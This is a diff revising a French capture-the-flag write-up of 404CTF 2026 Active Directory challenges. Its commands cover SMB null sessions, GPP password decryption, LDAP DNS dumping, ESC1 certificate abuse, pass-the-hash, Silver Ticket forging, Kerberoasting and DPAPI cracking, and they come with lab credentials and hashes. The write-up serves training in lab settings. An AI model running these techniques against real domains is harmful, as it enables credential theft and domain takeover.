@@ -1,11 +1,11 @@
 ---
-title: "404CTF 2026 — Challenges Réalistes Active Directory"
+title: Challenges Réalistes Active Directory"
 date: 2026-06-07
 platform: 404CTF 2026
 category: realist
 difficulty: hard
 tags: [ActiveDirectory, ADCS, DPAPI, Kerberos, GPP, SilverTicket, SMB]
-description: "Writeup des challenges réalistes AD du 404CTF 2026 — énumération, GPP decrypt, ADIDNS, Named Pipe IPC$, ESC1 ADCS, Kerberoasting AES, Silver Ticket et DPAPI."
+description: "Writeup des challenges réalistes AD du 404CTF 2026 — énumération, GPP decrypt, ADIDNS, Named Pipe, ESC1 ADCS, Kerberoasting AES, Silver Ticket et DPAPI."
 ---
 
 ## Les Cahiers de Curie
@@ -18,7 +18,7 @@ Enumération SMB en null session :
 nxc smb 10.0.10.56 -u '' -p '' --users
 ```
 
-Les utilisateurs sont exposés sans authentification.
+Les utilisateurs sont exposés sans authentification, le flag est présent dans la déscription de l'utilisateur "marie_curie" :
 
 ```
 404CTF{M4r13_Cur13_3st_Un3_Pr0!}
@@ -26,17 +26,19 @@ Les utilisateurs sont exposés sans authentification.
 
 ---
 
-## Le Secret de Lavoisier — GPP Credentials
+## Le Secret de Lavoisier
 
 **Cible :** `10.0.10.154`  
 **Credentials :** `metro3681_404Player` / `5369Hivgxil@$*`
 
-Enumération des partages :
+Enumération des users et des partages :
 
 ```bash
 nxc smb 10.0.10.154 -u 'metro3681_404Player' -p '5369Hivgxil@$*' --users
 smbclient //10.0.10.154/SYSVOL -U 'metro3681_404Player%5369Hivgxil@$*'
 ```
+
+On récupère le contenu du SYSVOL :
 
 ```bash
 smb: \> recurse on
@@ -45,18 +47,19 @@ smb: \> mget *
 find . -type f -exec strings {} \;
 ```
 
-Un fichier GPP contient un mot de passe chiffré. Le chiffrement GPP (AES-256) utilise une clé publique Microsoft — déchiffrement trivial :
+Un fichier GPP contient un mot de passe chiffré. Le chiffrement GPP (AES-256) utilise une clé publique Microsoft, l'outil gpp-decrypt nous permet de le déchiffrer :
 
 ```bash
 gpp-decrypt 'Ds5TqVEfXejILl8sHlc7R+UZtaGgP/Ong8YuGea+dS01Yz5SwdV7BCgrnWVDAkzPBhUZoXTmoxv/BqJeeGaXzw=='
-# → LavoisierForgotMyPassword2026!
+# LavoisierForgotMyPassword2026!
 ```
 
-Compte `backup_reader` compromis → accès au partage Backups :
+Le compte `backup_reader` compromis nous permet l'accès au partage Backups :
 
 ```bash
 smbclient //10.0.10.154/Backups -U 'backup_reader%LavoisierForgotMyPassword2026!'
 ```
+Et on récupère le flag : 
 
 ```
 404CTF{L4v01s13r_N_41m41t_P4s_L3s_GPP!}
@@ -64,21 +67,14 @@ smbclient //10.0.10.154/Backups -U 'backup_reader%LavoisierForgotMyPassword2026!
 
 ---
 
-## La Résolution de Le Verrier — ADIDNS via LDAP
+## La Résolution de Le Verrier
 
 **Cible :** `10.0.10.19`  
 **Credentials :** `maison3185_404Player` / `&!%dlalqm4380L`
-
-L'indice : Le Verrier a découvert Neptune **par le calcul** — le flag est dans les enregistrements DNS cachés, lisibles via LDAP.
-
 **AXFR bloqué ≠ DNS opaque.** Sur un AD Windows, les enregistrements DNS sont stockés dans LDAP sous `DomainDnsZones`.
 
 ```bash
-ldapsearch -x -H ldap://10.0.10.19 \
-  -D "maison3185_404Player@ctfcorp.local" \
-  -w '&!%dlalqm4380L' \
-  -b "CN=MicrosoftDNS,DC=DomainDnsZones,DC=ctfcorp,DC=local" \
-  "(objectClass=dnsNode)" dc dnsRecord | grep "^dc:"
+ldapsearch -x -H ldap://10.0.10.19 -D "maison3185_404Player@ctfcorp.local" -w '&!%dlalqm4380L' -b "CN=MicrosoftDNS,DC=DomainDnsZones,DC=ctfcorp,DC=local" "(objectClass=dnsNode)" dc dnsRecord | grep "^dc:"
 ```
 
 Un nœud suspect apparaît : `r3st0r3-7f3a91e2`
@@ -91,11 +87,11 @@ dig @10.0.10.19 TXT r3st0r3-7f3a91e2.challenge.ctfcorp.local
 404CTF{ADIDNS_LD4P_3num_R3v34ls_Wh4t_AXFR_H1d3s}
 ```
 
-> **Leçon :** AXFR bloqué ne signifie pas que les zones DNS sont protégées. Un compte AD authentifié peut dumper tous les enregistrements via LDAP — exactement comme Le Verrier a déduit Neptune sans jamais la voir.
+AXFR bloqué ne signifie pas que les zones DNS sont protégées. Un compte AD authentifié peut dumper tous les enregistrements via LDAP.
 
 ---
 
-## Protocole Pasteur \[1/3\] — Named Pipe IPC$
+## Protocole Pasteur \[1/3\]
 
 **Cible :** `10.0.10.81`  
 **Credentials :** `toit746_404Player` / `$*#4419Xyoiyqq`
@@ -133,7 +129,7 @@ OK 404CTF{P4st3ur_P1p3l1n3_Hello_St4g14ir3_2015}
 
 ---
 
-## L'Identité de Bertillon — ESC1 (AD CS)
+## L'Identité de Bertillon
 
 **Cible :** `10.0.10.159`  
 **Credentials :** `chien9341_404Player` / `qzpkpf*#%6159B`
@@ -144,32 +140,24 @@ Enumération des templates de certificats vulnérables :
 certipy find -u 'chien9341_404Player' -p 'qzpkpf*#%6159B' -dc-ip 10.0.10.159 -vulnerable -enabled
 ```
 
-Le template `CTFAuditorAuth` est vulnérable à **ESC1** — il permet de spécifier un UPN arbitraire dans la requête.
+Le template `CTFAuditorAuth` est vulnérable à **ESC1** : il permet de spécifier un UPN arbitraire dans la requête.
 
 ```bash
 # Synchroniser l'heure (obligatoire pour Kerberos)
 ntpdate -u 10.0.10.159
 
 # Demande de certificat en usurpant vip_auditor
-certipy req \
-  -u 'chien9341_404Player' \
-  -p 'qzpkpf*#%6159B' \
-  -dc-ip 10.0.10.159 \
-  -ca 'ctfcorp-DC1-CA' \
-  -template 'CTFAuditorAuth' \
-  -upn 'vip_auditor@ctfcorp.local'
+certipy req -u 'chien9341_404Player' -p 'qzpkpf*#%6159B' -dc-ip 10.0.10.159 -ca 'ctfcorp-DC1-CA' -template 'CTFAuditorAuth' -upn 'vip_auditor@ctfcorp.local'
 
-# Authentification → récupération du hash NTLM
+# Authentification et récupération du hash NTLM
 certipy auth -pfx vip_auditor.pfx -dc-ip 10.0.10.159
 ```
 
-Hash NTLM récupéré → Pass-the-Hash :
+Pass-the-Hash :
 
 ```bash
-smbclient.py \
-  -hashes aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe \
-  ctfcorp.local/vip_auditor@10.0.10.159
-# use AuditReports → get confidential_q1_audit.txt
+smbclient.py -hashes aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe ctfcorp.local/vip_auditor@10.0.10.159
+# use AuditReports => get confidential_q1_audit.txt
 ```
 
 ```
@@ -190,17 +178,10 @@ Le compte initial a `ReadGMSAPassword` sur `svc_broker$` :
 # Clé AES256 : 55b4857af9e48fa5b4be74a2ee1bd64ca985720787717c4bc3b205e13bb3d291
 ```
 
-`svc_broker$` a la délégation contrainte vers `HTTP/gateway.pasteur.lab`. `legacy_admin` est désactivé → S4U2Proxy impossible → **Silver Ticket**.
+`svc_broker$` a la délégation contrainte vers `HTTP/gateway.pasteur.lab`. `legacy_admin` est désactivé donc S4U2Proxy impossible, nous devons faire un **Silver Ticket**.
 
 ```bash
-ticketer.py \
-  -aesKey 55b4857af9e48fa5b4be74a2ee1bd64ca985720787717c4bc3b205e13bb3d291 \
-  -domain-sid S-1-5-21-2991091012-709284574-3735152529 \
-  -domain CTFCORP.LOCAL \
-  -spn HTTP/gateway.pasteur.lab \
-  -user-id 1105 \
-  -groups 1104,513,512 \
-  legacy_admin
+ticketer.py -aesKey 55b4857af9e48fa5b4be74a2ee1bd64ca985720787717c4bc3b205e13bb3d291 -domain-sid S-1-5-21-2991091012-709284574-3735152529 -domain CTFCORP.LOCAL -spn HTTP/gateway.pasteur.lab -user-id 1105 -groups 1104,513,512 legacy_admin
 ```
 
 Configuration Kerberos pour le realm cross-domain :
@@ -225,35 +206,28 @@ curl -s --negotiate -u : http://gateway.pasteur.lab:19432/flag
 ```
 404CTF{S1lv3r_P4st3ur_Gh0st_1d3nt1ty_L3g3ndr3}
 ```
-
-| Erreur | Cause | Fix |
-|--------|-------|-----|
-| `SPNEGO cannot find mechanisms` | `KRB5CCNAME` non défini | `export KRB5CCNAME=...` |
-| `Matching credential not found` | `gateway.pasteur.lab` résolu en `PASTEUR.LAB` | Mapper `.pasteur.lab = CTFCORP.LOCAL` dans `krb5.conf` |
-| `Ticket not yet valid` | Horloge en avance | Synchro via header `Date:` de la 401 |
-
 ---
 
-## Le Rayonnement de Becquerel — Kerberoasting + AES decrypt
+## Le Rayonnement de Becquerel
 
 **Cible :** `10.0.10.166`  
 **Credentials :** `rose4299_404Player` / `G3524*#!hvnmep`
 
-Kerberoasting → hash TGS crackable :
+Kerberoasting sur svc_reports :
 
 ```bash
 GetUserSPNs.py ctfcorp.local/rose4299_404Player:'G3524*#!hvnmep' -dc-ip 10.0.10.166 -request
-# → svc_reports : jerardo
+# svc_reports : jerardo
 ```
 
-Enumération LDAP avec `ldeep` → le champ `info` de `svc_reports` contient un blob base64 de 64 bytes :
+Enumération LDAP avec `ldeep`, le champ `info` de `svc_reports` contient un blob base64 de 64 bytes :
 
 ```bash
 ldeep ldap -u 'svc_reports' -p 'jerardo' -d ctfcorp.local -s ldap://10.0.10.166 all output.txt
 # info : ICe87sXN9KXC7PAqfvbo/fEXN0Nckl2K4Jf+96N9Wv4HAm25tOkoXaXx0hALmqQZB58ySOV6/7aBgziZx7Dr+w==
 ```
 
-Structure : `[16 bytes IV] + [48 bytes chiffrés]` — AES-256-CBC, clé = SHA-256 du mot de passe cracké.
+Structure : `[16 bytes IV] + [48 bytes chiffrés]` => AES-256-CBC, clé = SHA-256 du mot de passe cracké.
 
 ```python
 import base64, hashlib
@@ -271,61 +245,54 @@ print(pt.rstrip(bytes([pt[-1]])).decode())
 
 ---
 
-## Casse-toi le Stagiaire — DPAPI
+## Casse-toi le Stagiaire
 
 **Cible :** `10.0.10.192`  
 **Credentials :** `rose2092_404Player` / `!&*Z7333psucpx`
 
 Le partage `Archive$` contient une master key DPAPI et un blob `credential.dpapi`.
 
-**Etape 1 — Retrouver le SID du compte supprimé**
+**Etape 1 : Retrouver le SID du compte supprimé**
+
+Le compte `stagiaire2015` a été supprimé mais reste dans `Deleted Objects`. On le retrouve avec le flag LDAP `1.2.840.113556.1.4.417` (Show Deleted Objects) :
 
 ```bash
-ldapsearch -H ldap://10.0.10.192 \
-  -D "rose2092_404Player@ctfcorp.local" -w '!&*Z7333psucpx' \
-  -b "DC=ctfcorp,DC=local" -E '!1.2.840.113556.1.4.417' \
-  "(isDeleted=TRUE)" objectSid sAMAccountName
-# → stagiaire2015 : S-1-5-21-2991091012-709284574-3735152529-1104
+ldapsearch -H ldap://10.0.10.192 -D "rose2092_404Player@ctfcorp.local" -w '!&*Z7333psucpx' -b "DC=ctfcorp,DC=local" -E '!1.2.840.113556.1.4.417' "(isDeleted=TRUE)" objectSid sAMAccountName
 ```
 
-**Etape 2 — Cracker la master key**
+Le champ `objectSid` est encodé en base64, puis décodé nous donne du binaire.
+
+Il faut reconstruire le SID, cela peut être fait en perl, avec le module net ldap SID :
 
 ```bash
-python3 DPAPImk2john.py \
-  -S S-1-5-21-2991091012-709284574-3735152529-1104 \
-  -mk ef59a354-0c8e-4e49-8b50-f9ce74964916 \
-  -c domain > dpapi.hash
-# → mot de passe : pipeline
+Perl (Net::LDAP::SID)
+perl -MNet::LDAP::SID -E '
+  my $binary = qx(echo AQUAAAAAAAUVAAAARG1Ist7SRiqR56HeUAQAAA== | base64 --decode);
+  my $sid = Net::LDAP::SID->new($binary);
+  say $sid->as_string'
 ```
 
-**Etape 3 — Déchiffrer**
+```
+→ S-1-5-21-2991091012-709284574-3735152529-1104
+```
+
+**Etape 2 : Cracker la master key**
 
 ```bash
-dpapi.py masterkey \
-  -file ef59a354-0c8e-4e49-8b50-f9ce74964916 \
-  -sid S-1-5-21-2991091012-709284574-3735152529-1104 \
-  -password pipeline
+python3 DPAPImk2john.py -S S-1-5-21-2991091012-709284574-3735152529-1104 -mk ef59a354-0c8e-4e49-8b50-f9ce74964916 -c domain > dpapi.hash
+# pipeline
+```
 
-dpapi.py unprotect \
-  -file credential.dpapi \
-  -key 0x1dba8abe7fab73814a1bd5bcd9f1314713e686ab3d5fb5be6779d91730db0eafeafaa8f22400d25fdc154e36bb3a448666a4d80fe49193738ef9b07d28817391
+**Etape 3 : Déchiffrer**
+
+```bash
+# Decrypt a master key
+dpapi.py masterkey -file ef59a354-0c8e-4e49-8b50-f9ce74964916 -sid S-1-5-21-2991091012-709284574-3735152529-1104 -password pipeline
+
+# Decrypt DPAPI-protected data using a master key
+dpapi.py unprotect -file credential.dpapi -key 0x1dba8abe7fab73814a1bd5bcd9f1314713e686ab3d5fb5be6779d91730db0eafeafaa8f22400d25fdc154e36bb3a448666a4d80fe49193738ef9b07d28817391
 ```
 
 ```
 404CTF{C4ss3_T01_M41s_T4_C0rb31ll3_P4rl3_3nc0r3}
 ```
-
----
-
-## Récapitulatif
-
-| Challenge | Technique | Flag |
-|-----------|-----------|------|
-| Les Cahiers de Curie | Null session SMB | `404CTF{M4r13_Cur13...}` |
-| Le Secret de Lavoisier | GPP Decrypt | `404CTF{L4v01s13r...}` |
-| La Résolution de Le Verrier | ADIDNS via LDAP | `404CTF{ADIDNS_LD4P...}` |
-| Protocole Pasteur 1/3 | Named Pipe IPC$ | `404CTF{P4st3ur_P1p3l1n3...}` |
-| L'Identité de Bertillon | ESC1 AD CS | `404CTF{ESC1_Y0u_4r3...}` |
-| Protocole Pasteur 2/3 | Silver Ticket | `404CTF{S1lv3r_P4st3ur...}` |
-| Le Rayonnement de Becquerel | Kerberoasting + AES | `404CTF{RC4_TGS_Wh1sp3rs...}` |
-| Casse-toi le Stagiaire | DPAPI | `404CTF{C4ss3_T01...}` |
